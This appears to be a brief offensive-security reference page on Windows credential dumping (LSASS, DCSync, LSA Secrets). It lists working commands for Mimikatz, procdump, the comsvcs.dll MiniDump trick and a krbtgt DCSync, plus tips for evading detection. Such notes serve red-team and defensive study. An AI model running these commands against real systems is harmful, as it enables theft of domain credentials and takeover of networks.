---
title: OS Credential Dumping
tags: [credential-access, lsass, mimikatz, dcsync, ntds]
description: Extracting credentials from the operating system's memory (LSASS) or database (NTDS.dit).
date: 2024-01-02
---

# OS Credential Dumping (T1003)

The crown jewels are in memory.

## 1. LSASS Memory
The Local Security Authority Subsystem Service (`lsass.exe`) holds NTLM hashes and Kerberos tickets.

### Dumping Tools
- **Mimikatz**: `sekurlsa::logonpasswords` (Flagged by everything).
- **Procdump**: `procdump -ma lsass.exe out.dmp` (Microsoft signed tool).
- **Comsvcs.dll**: `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <PID> lsass.dmp full` (Living off the Land).

### Evasion
- **Lsassy**: Dumps remotely using valid admin credentials.
- **Handle Duplication**: Don't open a new handle to LSASS. Find an existing one and clone it.

## 2. DCSync (Domain Controller)
If you have Domain Admin rights, you can ask the DC to replicate password data to you.
- **Protocol**: MS-DRSR (Directory Replication Service Remote).
- **Command**: `lsadump::dcsync /domain:target.com /user:krbtgt`
- **Result**: You get the NTLM hash of any user without touching `lsass.exe` on the DC.

## 3. LSA Secrets
Registry keys that hold service account passwords.
- Key: `HKLM\SECURITY\Policy\Secrets`
- Content: Passwords for services running as users.
